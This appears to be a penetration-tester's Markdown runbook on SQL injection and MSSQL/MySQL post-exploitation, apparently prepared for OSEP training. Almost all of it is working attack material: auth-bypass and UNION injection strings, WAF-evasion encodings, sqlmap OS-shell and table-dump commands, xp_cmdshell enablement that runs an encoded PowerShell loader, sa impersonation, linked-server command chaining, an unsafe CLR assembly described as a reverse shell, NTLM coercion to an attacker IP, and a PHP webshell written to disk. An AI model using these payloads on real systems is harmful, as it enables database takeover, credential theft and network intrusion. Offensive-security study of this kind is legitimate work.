---
tags: [sql, mssql, mysql, sqli, lateral-movement, post-exploitation]
target_arch: x64
os: windows
---

# 🗄️ SQL Attacks & Post-Exploitation (400/500 Level)

> [!ABSTRACT]
> This runbook focuses on MSSQL and MySQL, moving from initial SQL injection to advanced post-exploitation, including linked server crawling and in-memory code execution.
> **Goal**: Use a database foothold to gain OS-level execution and pivot through the network.

---

## 🔍 Phase 1: Discovery & SQL Injection

### 1. Manual Testing (Quick Wins)
| Test | Payload (MSSQL) | Payload (MySQL) |
| :--- | :--- | :--- |
| **Error** | `'` or `"` | `'` or `"` |
| **Time-Based** | `'; WAITFOR DELAY '0:0:5'--` | `' AND SLEEP(5)--` |
| **Boolean** | `' AND 1=1--` | `' AND 1=1--` |
| **Version** | `SELECT @@version` | `SELECT version()` |

### 2. Automated SQLMap (The "OSEP Standard")
```bash
# From Burp Request (Most Reliable)
sqlmap -r request.txt --batch --dbms=mssql --level=5 --risk=3

# Get OS Shell (via xp_cmdshell)
sqlmap -r request.txt --batch --os-shell

# Tunneling SQLi (if target is internal)
proxychains sqlmap -u "http://172.16.1.50/view.php?id=1" --batch
```

---

## 🚀 Phase 2: MSSQL Post-Exploitation (400/500 Level)

### 1. The `xp_cmdshell` Pipeline
> [!TIP] Check if you are `sysadmin` first: `SELECT IS_SRVROLEMEMBER('sysadmin');`

```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute Command
EXEC xp_cmdshell 'whoami';

-- Execute PowerShell Loader (In-Memory)
EXEC xp_cmdshell 'powershell -enc <BASE64_BLOB>';
```

### 2. Impersonation (EXECUTE AS)
Find users you can impersonate to escalate to `sa`.
```sql
-- List Impersonation Targets
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate 'sa'
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin'); -- Returns 1 if successful
REVERT;
```

### 3. Linked Server Crawling (Recursive)
OSEP loves nested linked servers. Use `PowerUpSQL` for automation.
```powershell
# Enumerate & Crawl (Find paths to sysadmin)
Get-SQLServerLinkCrawl -Instance <IP> -Verbose

# Execute Command across a link
SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT @@servername; EXEC master..xp_cmdshell "whoami"');

# Double Hop (Link 1 -> Link 2)
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE; sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE; xp_cmdshell ''''whoami'''''') AT [LINK2]') AT [LINK1];
```

---

## 🛠️ Phase 3: Advanced Persistence & Evasion

### 1. CLR Assembly Loading (In-Memory C#)
Run C# tools (like a custom reverse shell) directly inside the SQL process.
```sql
-- 1. Enable CLR
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
EXEC sp_configure 'clr strict security', 0; RECONFIGURE; -- Required for SQL 2017+

-- 2. Import Assembly (Hex from DLL)
CREATE ASSEMBLY [MyShell] FROM 0x4D5A... WITH PERMISSION_SET = UNSAFE;

-- 3. Create Procedure
CREATE PROCEDURE [dbo].[RunShell] AS EXTERNAL NAME [MyShell].[StoredProcedures].[RunShell];

-- 4. Execute
EXEC [dbo].[RunShell];
```

### 2. NTLM Coercion (Capture/Relay)
Force the SQL service account (often a Managed Service Account or Domain User) to authenticate to you.
```sql
-- Trigger NTLM Auth
EXEC master..xp_dirtree '\<KALI_IP>\share', 1, 1;
```
*Capture with Responder or relay to LDAP/SMB.*

---

## 📂 Phase 4: MySQL Specifics

```sql
-- Read Local Files
SELECT LOAD_FILE('/etc/passwd');

-- Write Webshell (Into Outfile)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

---

## 🌐 Web SQLi Quick Reference (Web App Initial Access)

### Auth Bypass
```sql
admin'--
admin' #
' OR '1'='1'--
' OR 1=1 LIMIT 1-- -+
') OR ('1'='1
```

### WAF Bypass Techniques
```sql
-- Comment splitting
SeL/**/ecT * Fr/**/oM users--
UnI/**/oN SeL/**/eCt NULL,NULL--

-- URL encoding
%53%45%4c%45%43%54      -- SELECT hex encoded

-- Case variation
SeLeCt * fRoM users--

-- Whitespace alternatives
SELECT%09column%09FROM%09table      -- Tab
SELECT+column+FROM+table            -- Plus sign
SELECT/**/column/**/FROM/**/table   -- Comment

-- String concat to avoid keyword detection
CONCAT('SE','LECT') * FROM users
CHAR(115,101,108,101,99,116)        -- ASCII chars for 'select'
```

### UNION Injection Pattern
```sql
-- Step 1: Find column count
' ORDER BY 1--   ' ORDER BY 2--   ' ORDER BY 3--   (until error)

-- Step 2: Find injectable position
' UNION SELECT NULL,NULL,NULL--

-- Step 3: Extract
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password,NULL FROM users--
```

### Time-Based Blind
```sql
' AND SLEEP(5)--                            # MySQL
'; IF 1=1 WAITFOR DELAY '0:0:5'--          # MSSQL
' AND 1=(SELECT 1 FROM pg_sleep(5))--       # PostgreSQL
```

### sqlmap Automation
```bash
sqlmap -r request.txt --batch --dbms=mssql --level=5 --risk=3
sqlmap -r request.txt --batch --os-shell         # get xp_cmdshell
sqlmap -u "http://TARGET/page?id=1" --dbs        # list databases
sqlmap -u "http://TARGET/page?id=1" -D db -T users --dump
sqlmap -u "http://TARGET/page?id=1" --tamper=space2comment,randomcase  # WAF bypass
proxychains sqlmap -u "http://INTERNAL/?id=1" --batch                  # through SOCKS
```

---

## 🔗 Related Notes
- [[Active Directory]] - For NTLM relaying targets.
- [[Admin Reference]] - For `netsh` port forwarding to reach internal SQL ports.
- [[03-loaders/RUNBOOK]] - For compiling CLR assemblies.
- [[Tunneling]] - For reaching 1433/3306 across segments.
- [[05-lateral-movement/mssql/RUNBOOK.md]] - Advanced MSSQL: TRUSTWORTHY, OLE, Agent jobs, multi-hop
- [[05-lateral-movement/mssql/ntlm-via-sql.md]] - xp_dirtree hash capture + relay full workflow
